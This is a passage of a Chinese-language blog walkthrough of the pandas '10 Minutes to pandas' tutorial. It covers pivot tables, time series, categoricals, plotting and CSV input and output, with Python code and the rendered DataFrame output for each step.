<th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="2" valign="top">one</th>      <th>A</th>      <td>1.402402</td>      <td>0.745205</td>    </tr>    <tr>      <th>B</th>      <td>-0.215913</td>      <td>0.872718</td>    </tr>    <tr>      <th rowspan="2" valign="top">two</th>      <th>A</th>      <td>-0.305333</td>      <td>0.421718</td>    </tr>    <tr>      <th>B</th>      <td>-0.679614</td>      <td>-0.662528</td>    </tr>  </tbody></table></div><h3 id="0x0A-2-数据透视表-Pivot-Tables"><a href="#0x0A-2-数据透视表-Pivot-Tables" class="headerlink" title="0x0A-2 数据透视表 Pivot Tables"></a>0x0A-2 数据透视表 Pivot Tables</h3><pre class=" language-python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'A'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">,</span>                   <span class="token string">'B'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span>                   <span class="token string">'C'</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span>                   <span class="token string">'D'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                   <span class="token string">'E'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>one</td>      <td>A</td>      <td>foo</td>      <td>0.072696</td>      <td>0.305015</td>    </tr>    <tr>      <th>1</th>      <td>one</td>      <td>B</td>      <td>foo</td>      <td>1.428383</td>      <td>-1.108178</td>    </tr>    <tr>      <th>2</th>      <td>two</td>      <td>C</td>      <td>foo</td>      <td>1.239483</td>      <td>0.001580</td>    </tr>    <tr>      <th>3</th>      <td>three</td>      <td>A</td>      <td>bar</td>      <td>-0.953547</td>      <td>1.061740</td>    </tr>    <tr>      <th>4</th>      <td>one</td>      <td>B</td>      <td>bar</td>      <td>0.762730</td>      <td>1.161542</td>    </tr>    <tr>      <th>5</th>      <td>one</td>      <td>C</td>      <td>bar</td>      <td>-0.372740</td>      <td>-0.480251</td>    </tr>    <tr>      <th>6</th>      <td>two</td>      <td>A</td>      <td>foo</td>      <td>0.765181</td>      <td>-1.034218</td>    </tr>    <tr>      <th>7</th>      <td>three</td>      <td>B</td>      <td>foo</td>      <td>-1.858334</td>      <td>0.359220</td>    </tr>    <tr>      <th>8</th>      <td>one</td>      <td>C</td>      <td>foo</td>      <td>-0.952807</td>      <td>1.067494</td>    </tr>    <tr>      <th>9</th>      <td>one</td>      <td>A</td>      <td>bar</td>      <td>0.541013</td>      <td>-0.280833</td>    </tr>    <tr>      <th>10</th>      <td>two</td>      <td>B</td>      <td>bar</td>      <td>-1.810560</td>      <td>-0.829793</td>    </tr>    <tr>      <th>11</th>      <td>three</td>      <td>C</td>      <td>bar</td>      <td>-1.049108</td>      <td>-0.295998</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">pd<span class="token punctuation">.</span>pivot_table<span class="token punctuation">(</span>df<span class="token punctuation">,</span> values<span class="token operator">=</span><span class="token string">'D'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>C</th>      <th>bar</th>      <th>foo</th>    </tr>    <tr>      <th>A</th>      <th>B</th>      <th></th>      <th></th>    </tr>  </thead>  <tbody>    <tr>      <th rowspan="3" valign="top">one</th>      <th>A</th>      <td>0.541013</td>      <td>0.072696</td>    </tr>    <tr>      <th>B</th>      <td>0.762730</td>      <td>1.428383</td>    </tr>    <tr>      <th>C</th>      <td>-0.372740</td>      <td>-0.952807</td>    </tr>    <tr>      <th rowspan="3" valign="top">three</th>      <th>A</th>      <td>-0.953547</td>      <td>NaN</td>    </tr>    <tr>      <th>B</th>      <td>NaN</td>      <td>-1.858334</td>    </tr>    <tr>      <th>C</th>      <td>-1.049108</td>      <td>NaN</td>    </tr>    <tr>      <th rowspan="3" valign="top">two</th>      <th>A</th>      <td>NaN</td>      <td>0.765181</td>    </tr>    <tr>      <th>B</th>      <td>-1.810560</td>      <td>NaN</td>    </tr>    <tr>      <th>C</th>      <td>NaN</td>      <td>1.239483</td>    </tr>  </tbody></table></div><h2 id="0x0B-时间序列-Time-Series"><a href="#0x0B-时间序列-Time-Series" class="headerlink" title="0x0B 时间序列  Time Series"></a>0x0B 时间序列  Time Series</h2><p>Pandas 在对频率转换进行重新采样时拥有简单、强大且高效的功能（如将按秒采样的数据转换为按5分钟为单位进行采样的数据）。这种操作在金融领域非常常见，但不局限于此。</p><p><em>哇，原来还可以这样玩唉（</em></p><p>这个在信号处理里面也很常用的呢！</p><pre class=" language-python"><code class="language-python">rng <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'1/1/2020'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'S'</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>rng<span class="token punctuation">)</span>ts<span class="token punctuation">.</span>resample<span class="token punctuation">(</span><span class="token string">'1Min'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>2020-01-01 00:00:00    132442020-01-01 00:01:00    147992020-01-01 00:02:00    154892020-01-01 00:03:00     3894Freq: T, dtype: int32</code></pre><h3 id="时区表示"><a href="#时区表示" class="headerlink" title="时区表示"></a>时区表示</h3><pre class=" language-python"><code class="language-python">rng <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'4/16/2020 00:00'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'D'</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>len<span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rng<span class="token punctuation">)</span>ts</code></pre><pre><code>2020-04-16    0.8720432020-04-17   -0.3052002020-04-18    1.6818282020-04-19    0.1631842020-04-20    1.415422Freq: D, dtype: float64</code></pre><pre class=" language-python"><code class="language-python">ts_utc <span class="token operator">=</span> ts<span class="token punctuation">.</span>tz_localize<span class="token punctuation">(</span><span class="token string">'UTC'</span><span class="token punctuation">)</span>ts_utc</code></pre><pre><code>2020-04-16 00:00:00+00:00    0.8720432020-04-17 00:00:00+00:00   -0.3052002020-04-18 00:00:00+00:00    1.6818282020-04-19 00:00:00+00:00    0.1631842020-04-20 00:00:00+00:00    1.415422Freq: D, dtype: float64</code></pre><h3 id="转换到另外一个时区"><a href="#转换到另外一个时区" class="headerlink" title="转换到另外一个时区"></a>转换到另外一个时区</h3><pre class=" language-python"><code class="language-python">ts_utc<span class="token punctuation">.</span>tz_convert<span class="token punctuation">(</span><span class="token string">'Asia/Shanghai'</span><span class="token punctuation">)</span></code></pre><pre><code>2020-04-16 08:00:00+08:00    0.8720432020-04-17 08:00:00+08:00   -0.3052002020-04-18 08:00:00+08:00    1.6818282020-04-19 08:00:00+08:00    0.1631842020-04-20 08:00:00+08:00    1.415422Freq: D, dtype: float64</code></pre><h3 id="时间跨度转换"><a href="#时间跨度转换" class="headerlink" title="时间跨度转换"></a>时间跨度转换</h3><pre class=" language-python"><code class="language-python">rng <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'1/1/2020'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'M'</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>len<span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>rng<span class="token punctuation">)</span>ts</code></pre><pre><code>2020-01-31    0.2598472020-02-29   -0.0929692020-03-31    0.5259852020-04-30    0.0903622020-05-31    1.707569Freq: M, dtype: float64</code></pre><pre class=" language-python"><code class="language-python">ps <span class="token operator">=</span> ts<span class="token punctuation">.</span>to_period<span class="token punctuation">(</span><span class="token punctuation">)</span>ps</code></pre><pre><code>2020-01    0.2598472020-02   -0.0929692020-03    0.5259852020-04    0.0903622020-05    1.707569Freq: M, dtype: float64</code></pre><pre class=" language-python"><code class="language-python">ps<span class="token punctuation">.</span>to_timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>2020-01-01    0.2598472020-02-01   -0.0929692020-03-01    0.5259852020-04-01    0.0903622020-05-01    1.707569Freq: MS, dtype: float64</code></pre><p>时期和时间戳之间的转换使得可以使用一些方便的算术函数。</p><p>下面这个例子，转换一个每年以11月结束的季度频率为 季度结束后的月末的上午9点。<em>（有点懵</em></p><pre class=" language-python"><code class="language-python">prng <span class="token operator">=</span> pd<span class="token punctuation">.</span>period_range<span class="token punctuation">(</span><span class="token string">'1990Q1'</span><span class="token punctuation">,</span> <span class="token string">'2000Q4'</span><span class="token punctuation">,</span> freq<span class="token operator">=</span><span class="token string">'Q-NOV'</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>len<span class="token punctuation">(</span>prng<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prng<span class="token punctuation">)</span>ts<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token punctuation">(</span>prng<span class="token punctuation">.</span>asfreq<span class="token punctuation">(</span><span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asfreq<span class="token punctuation">(</span><span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">9</span>ts<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>1990-03-01 09:00   -1.2874111990-06-01 09:00    1.7444851990-09-01 09:00    0.3365611990-12-01 09:00   -1.2065761991-03-01 09:00    0.108631Freq: H, dtype: float64</code></pre><h2 id="0x0C-类别-Categoricals"><a href="#0x0C-类别-Categoricals" class="headerlink" title="0x0C 类别 Categoricals"></a>0x0C 类别 Categoricals</h2><p>pandas 可以在 DataFrame 中支持 category 类型的数据。</p><pre class=" language-python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"raw_grade"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>将 raw grades 转换为 category 数据类型。</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">"raw_grade"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token string">"category"</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span></code></pre><pre><code>0    a1    b2    b3    a4    a5    eName: grade, dtype: categoryCategories (3, object): [a, b, e]</code></pre><p>将 category 类型数据重命名为更有意义的名称，利用<code>Series.cat.categories</code>方法。</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cat<span class="token punctuation">.</span>categories <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"very good"</span><span class="token punctuation">,</span> <span class="token string">"good"</span><span class="token punctuation">,</span> <span class="token string">"very bad"</span><span class="token punctuation">]</span>df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span></code></pre><pre><code>0    very good1         good2         good3    very good4    very good5     very badName: grade, dtype: categoryCategories (3, object): [very good, good, very bad]</code></pre><p>对类别进行重新排序，同时增加缺失的类别。</p><p><code>Series.cat</code>下的方法默认返回一个新的序列。</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span> <span class="token operator">=</span> df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cat<span class="token punctuation">.</span>set_categories<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"very bad"</span><span class="token punctuation">,</span> <span class="token string">"bad"</span><span class="token punctuation">,</span> <span class="token string">"medium"</span><span class="token punctuation">,</span> <span class="token string">"good"</span><span class="token punctuation">,</span> <span class="token string">"very good"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">"grade"</span><span class="token punctuation">]</span></code></pre><pre><code>0    very good1         good2         good3    very good4    very good5     very badName: grade, dtype: categoryCategories (5, object): [very bad, bad, medium, good, very good]</code></pre><p> 排序是按照 category 的顺序进行的，而不是按照词汇顺序(lexical order)。</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>by<span class="token operator">=</span><span class="token string">"grade"</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>id</th>      <th>raw_grade</th>      <th>grade</th>    </tr>  </thead>  <tbody>    <tr>      <th>5</th>      <td>6</td>      <td>e</td>      <td>very bad</td>    </tr>    <tr>      <th>1</th>      <td>2</td>      <td>b</td>      <td>good</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>b</td>      <td>good</td>    </tr>    <tr>      <th>0</th>      <td>1</td>      <td>a</td>      <td>very good</td>    </tr>    <tr>      <th>3</th>      <td>4</td>      <td>a</td>      <td>very good</td>    </tr>    <tr>      <th>4</th>      <td>5</td>      <td>a</td>      <td>very good</td>    </tr>  </tbody></table></div><p>对一个 Category 类型的列进行分组时显示了空的类别。</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">"grade"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>gradevery bad     1bad          0medium       0good         2very good    3dtype: int64</code></pre><h2 id="0x0D-作图-Plotting"><a href="#0x0D-作图-Plotting" class="headerlink" title="0x0D 作图 Plotting"></a>0x0D 作图 Plotting</h2><pre class=" language-python"><code class="language-python">ts <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'1/1/2020'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ts <span class="token operator">=</span> ts<span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span><span class="token punctuation">)</span>ts<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>&lt;matplotlib.axes._subplots.AxesSubplot at 0x250ccebcb70&gt;</code></pre><p><img src="/2020/04/17/DataScience_10MinutesToPandas/output_202_1.png" alt="png"></p><p>对于 DataFrame 而言，<code>plot()</code>方法是一种将所有带有标签的列进行绘制的简便方法。</p><pre class=" language-python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>ts<span class="token punctuation">.</span>index<span class="token punctuation">,</span>                  columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(df)</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">'best'</span><span class="token punctuation">)</span></code></pre><pre><code>&lt;matplotlib.legend.Legend at 0x250ce7620b8&gt;&lt;Figure size 432x288 with 0 Axes&gt;</code></pre><p><img src="/2020/04/17/DataScience_10MinutesToPandas/output_204_2.png" alt="png"></p><pre class=" language-python"><code class="language-python">ts<span class="token punctuation">.</span>index</code></pre><pre><code>DatetimeIndex(['2020-01-01', '2020-01-02', '2020-01-03', '2020-01-04',               '2020-01-05', '2020-01-06', '2020-01-07', '2020-01-08',               '2020-01-09', '2020-01-10',               ...               '2022-09-17', '2022-09-18', '2022-09-19', '2022-09-20',               '2022-09-21', '2022-09-22', '2022-09-23', '2022-09-24',               '2022-09-25', '2022-09-26'],              dtype='datetime64[ns]', length=1000, freq='D')</code></pre><h2 id="0x0E-导入导出数据-Getting-Data-In-Out"><a href="#0x0E-导入导出数据-Getting-Data-In-Out" class="headerlink" title="0x0E 导入导出数据 Getting Data In/Out"></a>0x0E 导入导出数据 Getting Data In/Out</h2><h3 id="0x0E-1-CSV"><a href="#0x0E-1-CSV" class="headerlink" title="0x0E-1 CSV"></a>0x0E-1 CSV</h3><p><strong>写入 csv 文件</strong></p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'foo.csv'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 保存在当前目录下</span></code></pre><p><strong>从 csv 文件中导入数据</strong></p><pre class=" language-python"><code class="language-python">pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'foo.csv'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Unnamed: 0</th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>2020-01-01</td>      <td>-1.397481</td>      <td>-0.453722</td>      <td>1.374079</td>      <td>-2.095767</td>    </tr>    <tr>      <th>1</th>      <td>2020-01-02</td>      <td>-1.363418</td>      <td>0.529293</td>      <td>0.178497</td>      <td>-2.364989</td>    </tr>    <tr>      <th>2</th>      <td>2020-01-03</td>      <td>-2.047267</td>      <td>-0.333020</td>      <td>0.379978</td>      <td>-2.628204</td>    </tr>    <tr>      <th>3</th>      <td>2020-01-04</td>      <td>-2.305870</td>      <td>-0.145598</td>      <td>-0.232491</td>      <td>-2.812290</td>    </tr>    <tr>      <th>4</th>      <td>2020-01-05</td>      <td>-1.851390</td>      <td>-1.378215</td>      <td>-1.202399</td>      <td>-4.574516</td>    </tr>    <tr>      <th>5</th>      <td>2020-01-06</td>      <td>-3.438928</td>      <td>-0.779975</td>      <td>-1.864979</td>      <td>-5.666847</td>    </tr>    <tr>      <th>6</th>      <td>2020-01-07</td>      <td>-4.201270</td>      <td>-0.827366</td>      <td>-0.796513</td>      <td>-5.267628</td>    </tr>    <tr>      <th>7</th>      <td>2020-01-08</td>      <td>-5.682762</td>      <td>-1.009404</td>      <td>-0.760801</td>      <td>-4.696243</td>    </tr>    <tr>      <th>8</th>      <td>2020-01-09</td>      <td>-4.362126</td>      <td>-0.768552</td>      <td>-0.747517</td>      <td>-5.562345</td>    </tr>    <tr>      <th>9</th>      <td>2020-01-10</td>      <td>-5.226357</td>      <td>-1.791920</td>      <td>0.290504</td>      <td>-5.214061</td>    </tr>    <tr>      <th>10</th>      <td>2020-01-11</td>      <td>-4.429691</td>      <td>-2.026951</td>      <td>-0.821212</td>      <td>-6.621030</td>    </tr>    <tr>      <th>11</th>      <td>2020-01-12</td>      <td>-4.222744</td>      <td>-2.875169</td>      <td>-0.654313</td>      <td>-5.926621</td>    </tr>    <tr>      <th>12</th>      <td>2020-01-13</td>      <td>-2.413314</td>      <td>-3.329878</td>      <td>-1.595397</td>      <td>-5.585677</td>    </tr>    <tr>      <th>13</th>      <td>2020-01-14</td>      <td>-2.769944</td>      <td>-3.536045</td>      <td>-1.463671</td>      <td>-5.098753</td>    </tr>    <tr>      <th>14</th>      <td>2020-01-15</td>      <td>-3.599683</td>      <td>-4.973067</td>      <td>-3.859425</td>      <td>-5.823875</td>    </tr>    <tr>      <th>15</th>      <td>2020-01-16</td>      <td>-3.486154</td>      <td>-4.792330</td>      <td>-2.866047</td>      <td>-6.312086</td>    </tr>    <tr>      <th>16</th>      <td>2020-01-17</td>      <td>-4.232714</td>      <td>-5.082053</td>      <td>-3.572924</td>      <td>-8.478300</td>    </tr>    <tr>      <th>17</th>      <td>2020-01-18</td>      <td>-5.346857</td>      <td>-5.787422</td>      <td>-4.313125</td>      <td>-8.595854</td>    </tr>    <tr>      <th>18</th>      <td>2020-01-19</td>      <td>-5.720494</td>      <td>-5.620498</td>      <td>-3.699862</td>      <td>-9.678113</td>    </tr>    <tr>      <th>19</th>      <td>2020-01-20</td>      <td>-5.264735</td>      <td>-4.938944</td>      <td>-2.354040</td>      <td>-8.942524</td>    </tr>    <tr>      <th>20</th>      <td>2020-01-21</td>      <td>-5.407854</td>      <td>-5.379811</td>      <td>-2.284447</td>      <td>-8.068545</td>    </tr>    <tr>      <th>21</th>      <td>2020-01-22</td>      <td>-5.793401</td>      <td>-5.501279</td>      <td>-2.254013</td>      <td>-7.997644</td>    </tr>    <tr>      <th>22</th>      <td>2020-01-23</td>      <td>-6.796539</td>      <td>-4.692782</td>      <td>-2.330458</td>      <td>-7.449650</td>    </tr>    <tr>      <th>23</th>      <td>2020-01-24</td>      <td>-7.502072</td>      <td>-4.085084</td>      <td>-1.810495</td>      <td>-6.540544</td>    </tr>    <tr>      <th>24</th>      <td>2020-01-25</td>      <td>-7.639024</td>      <td>-3.791416</td>      <td>1.214301</td>      <td>-7.599166</td>    </tr>    <tr>      <th>25</th>      <td>2020-01-26</td>      <td>-7.783544</td>      <td>-2.180918</td>      <td>1.628560</td>      <td>-7.928116</td>    </tr>    <tr>      <th>26</th>      <td>2020-01-27</td>      <td>-7.673699</td>      <td>-3.485888</td>      <td>0.640970</td>      <td>-8.124872</td>    </tr>    <tr>      <th>27</th>      <td>2020-01-28</td>      <td>-7.435098</td>      <td>-4.480212</td>      <td>-0.409425</td>      <td>-7.943383</td>    </tr>    <tr>      <th>28</th>      <td>2020-01-29</td>      <td>-6.843557</td>      <td>-5.069680</td>      <td>-1.650871</td>      <td>-7.311741</td>    </tr>    <tr>      <th>29</th>      <td>2020-01-30</td>      <td>-7.647267</td>      <td>-4.115332</td>      <td>-1.558887</td>      <td>-6.308304</td>    </tr>    <tr>      <th>...</th>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>      <td>...</td>    </tr>    <tr>      <th>970</th>      <td>2022-08-28</td>      <td>17.157914</td>      <td>-23.306973</td>      <td>-12.461653</td>      <td>-2.478731</td>    </tr>    <tr>      <th>971</th>      <td>2022-08-29</td>      <td>18.207251</td>      <td>-23.725280</td>      <td>-12.912440</td>      <td>-2.664828</td>    </tr>    <tr>      <th>972</th>      <td>2022-08-30</td>      <td>17.968302</td>      <td>-21.485150</td>      <td>-15.044877</td>      <td>-4.034060</td>    </tr>    <tr>      <th>973</th>      <td>2022-08-31</td>      <td>18.933869</td>      <td>-21.587237</td>      <td>-16.046081</td>      <td>-4.014128</td>    </tr>    <tr>      <th>974</th>      <td>2022-09-01</td>      <td>18.337284</td>      <td>-21.451739</td>      <td>-15.028398</td>      <td>-4.147177</td>    </tr>    <tr>      <th>975</th>      <td>2022-09-02</td>      <td>18.783912</td>      <td>-21.096423</td>      <td>-15.506137</td>      <td>-3.858413</td>    </tr>    <tr>      <th>976</th>      <td>2022-09-03</td>      <td>18.828378</td>      <td>-19.514168</td>      <td>-16.924864</td>      <td>-2.559397</td>    </tr>    <tr>      <th>977</th>      <td>2022-09-04</td>      <td>18.570511</td>      <td>-21.482747</td>      <td>-17.147155</td>      <td>-4.267082</td>    </tr>    <tr>      <th>978</th>      <td>2022-09-05</td>      <td>17.212119</td>      <td>-22.331837</td>      <td>-16.496095</td>      <td>-5.990857</td>    </tr>    <tr>      <th>979</th>      <td>2022-09-06</td>      <td>15.726498</td>      <td>-23.219830</td>      <td>-19.321023</td>      <td>-5.281962</td>    </tr>    <tr>      <th>980</th>      <td>2022-09-07</td>      <td>16.053999</td>      <td>-22.681168</td>      <td>-19.139536</td>      <td>-5.587482</td>    </tr>    <tr>      <th>981</th>      <td>2022-09-08</td>      <td>17.335456</td>      <td>-23.320514</td>      <td>-21.271891</td>      <td>-4.048170</td>    </tr>    <tr>      <th>982</th>      <td>2022-09-09</td>      <td>16.925567</td>      <td>-24.175782</td>      <td>-22.318101</td>      <td>-4.890968</td>    </tr>    <tr>      <th>983</th>      <td>2022-09-10</td>      <td>18.652048</td>      <td>-25.436089</td>      <td>-22.213175</td>      <td>-6.330027</td>    </tr>    <tr>      <th>984</th>      <td>2022-09-11</td>      <td>19.535978</td>      <td>-25.673818</td>      <td>-23.064392</td>      <td>-5.673334</td>    </tr>    <tr>      <th>985</th>      <td>2022-09-12</td>      <td>19.632355</td>      <td>-26.369119</td>      <td>-22.953900</td>      <td>-3.463010</td>    </tr>    <tr>      <th>986</th>      <td>2022-09-13</td>      <td>18.792587</td>      